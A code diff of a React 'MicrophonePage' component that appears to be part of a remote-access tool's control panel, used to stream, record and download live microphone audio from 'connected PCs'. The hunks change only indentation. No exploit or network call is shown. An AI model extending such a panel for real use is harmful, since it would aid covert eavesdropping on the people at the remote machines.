@@ -30,7 +30,7 @@ const MicrophonePage = () => {
         currentSourceRef.current.stop()
         currentSourceRef.current = null
       }
-      if (audioContextRef.current) {
+    if (audioContextRef.current) {
         audioContextRef.current.close().catch(e => {
           console.error('[Microphone] Error closing audio context:', e)
         })
@@ -58,7 +58,7 @@ const MicrophonePage = () => {
       showToast('Please select a PC', 'error')
       return
     }
-
+    
     setIsConnecting(true)
     setAudioChunks([]) // Clear previous chunks
     setChunkCounter(0) // Reset counter
@@ -119,7 +119,7 @@ const MicrophonePage = () => {
                 
                 return newChunkNumber
               })
-            } catch (error) {
+        } catch (error) {
               console.error('[Microphone] Error processing audio chunk:', error)
             }
           }
@@ -365,22 +365,22 @@ const MicrophonePage = () => {
       {/* Enhanced Header Section */}
       <div className="bg-gradient-to-br from-hack-dark via-hack-dark to-hack-darker border border-hack-green/30 rounded-xl p-6 shadow-2xl">
         <div className="flex items-center justify-between mb-6">
-          <div className="flex items-center gap-4">
+            <div className="flex items-center gap-4">
             <div className="p-3 bg-gradient-to-br from-hack-green/20 to-hack-green/10 rounded-xl border border-hack-green/30 shadow-lg">
               <Mic className="text-hack-green" size={32} />
-            </div>
-            <div>
+              </div>
+              <div>
               <h2 className="text-3xl font-mono text-hack-green font-bold tracking-tight">Microphone Stream</h2>
               <p className="text-sm text-gray-400 font-mono mt-1.5">Capture and monitor real-time audio from connected PCs</p>
             </div>
-          </div>
-          {isStreaming && (
+            </div>
+            {isStreaming && (
             <div className="flex items-center gap-2 px-4 py-2 bg-red-500/20 border border-red-500/50 rounded-lg">
               <div className="w-2.5 h-2.5 bg-red-500 rounded-full animate-pulse"></div>
               <span className="text-red-400 font-mono text-sm font-semibold">LIVE</span>
-            </div>
-          )}
-        </div>
+              </div>
+            )}
+          </div>
 
         {/* PC Selection */}
         <div className="mb-6">
@@ -410,7 +410,7 @@ const MicrophonePage = () => {
 
         {/* Enhanced Controls */}
         <div className="flex flex-wrap gap-3 mb-6">
-          <button
+                    <button
             onClick={startStream}
             disabled={!selectedPC || isStreaming || isConnecting}
             className="flex items-center gap-2 px-6 py-3 bg-gradient-to-r from-hack-green/20 to-hack-green/10 hover:from-hack-green/30 hover:to-hack-green/20 border-2 border-hack-green text-hack-green rounded-lg transition-all font-mono disabled:opacity-50 disabled:cursor-not-allowed font-semibold shadow-lg hover:shadow-hack-green/20"
@@ -426,24 +426,24 @@ const MicrophonePage = () => {
                 <span>Start Stream</span>
               </>
             )}
-          </button>
+                    </button>
 
-          <button
+                    <button
             onClick={stopStream}
             disabled={!isStreaming}
             className="flex items-center gap-2 px-6 py-3 bg-gradient-to-r from-red-500/20 to-red-500/10 hover:from-red-500/30 hover:to-red-500/20 border-2 border-red-500 text-red-400 rounded-lg transition-all font-mono disabled:opacity-50 disabled:cursor-not-allowed font-semibold shadow-lg hover:shadow-red-500/20"
           >
             <PowerOff size={20} />
             <span>Stop Stream</span>
-          </button>
+                    </button>
 
-          <button
+                    <button
             onClick={loadPCs}
             className="flex items-center gap-2 px-6 py-3 bg-hack-gray/80 hover:bg-hack-gray border-2 border-hack-green/30 text-white rounded-lg transition-all font-mono font-semibold shadow-lg"
-          >
+                    >
             <RefreshCw size={20} />
             <span>Refresh</span>
-          </button>
+                    </button>
         </div>
 
         {/* Enhanced Status */}
@@ -463,13 +463,13 @@ const MicrophonePage = () => {
                   <span className="text-gray-400 block text-xs">Status</span>
                   <span className={isStreaming ? 'text-hack-green font-semibold' : 'text-gray-400'}>
                     {isStreaming ? 'Streaming' : 'Stopped'}
-                  </span>
+                    </span>
                 </div>
               </div>
             </div>
           </div>
         )}
-      </div>
+                  </div>
 
       {/* Enhanced Audio Chunks List */}
       <div className="bg-gradient-to-br from-hack-dark via-hack-dark to-hack-darker border border-hack-green/30 rounded-xl p-6 shadow-2xl">
@@ -477,14 +477,14 @@ const MicrophonePage = () => {
           <div className="flex items-center gap-4">
             <div className="p-2.5 bg-hack-green/10 rounded-lg border border-hack-green/30">
               <Activity className="text-hack-green" size={24} />
-            </div>
+                </div>
             <div>
               <h3 className="text-xl font-mono text-hack-green font-bold">Audio Chunks</h3>
               <p className="text-xs text-gray-400 font-mono mt-0.5">
                 {audioChunks.length} {audioChunks.length === 1 ? 'chunk' : 'chunks'} recorded
               </p>
-            </div>
-          </div>
+                  </div>
+                </div>
           {audioChunks.length > 0 && (
             <button
               onClick={clearAllChunks}
@@ -500,7 +500,7 @@ const MicrophonePage = () => {
           <div className="text-center py-20">
             <div className="inline-flex p-6 bg-hack-darker/60 rounded-full mb-6 border border-hack-green/20">
               <Mic className="text-gray-500" size={48} />
-            </div>
+                  </div>
             <p className="text-gray-400 font-mono text-xl mb-2 font-semibold">
               {isStreaming ? 'Waiting for audio chunks...' : 'No audio chunks received'}
             </p>
@@ -509,8 +509,8 @@ const MicrophonePage = () => {
                 ? 'Audio will appear here as chunks are received from the PC' 
                 : 'Start streaming to capture audio from the selected PC'}
             </p>
-          </div>
-        ) : (
+                </div>
+              ) : (
           <div className="space-y-3 max-h-[600px] overflow-y-auto custom-scrollbar pr-2">
             {audioChunks.map((chunk, index) => (
               <div
@@ -576,11 +576,11 @@ const MicrophonePage = () => {
                         Play
                       </button>
                     )}
-                    <button
+                                <button
                       onClick={() => downloadChunk(chunk)}
                       className="px-5 py-2.5 bg-blue-500/20 hover:bg-blue-500/30 border-2 border-blue-500 text-blue-400 rounded-lg transition-all font-mono text-sm font-semibold flex items-center gap-2 shadow-lg hover:shadow-blue-500/20"
-                    >
-                      <Download size={16} />
+                                >
+                                  <Download size={16} />
                       Download
                     </button>
                     <button
@@ -589,10 +589,10 @@ const MicrophonePage = () => {
                       title="Delete chunk"
                     >
                       <Trash2 size={16} />
-                    </button>
+                                </button>
                   </div>
                 </div>
-              </div>
+            </div>
             ))}
           </div>
         )}
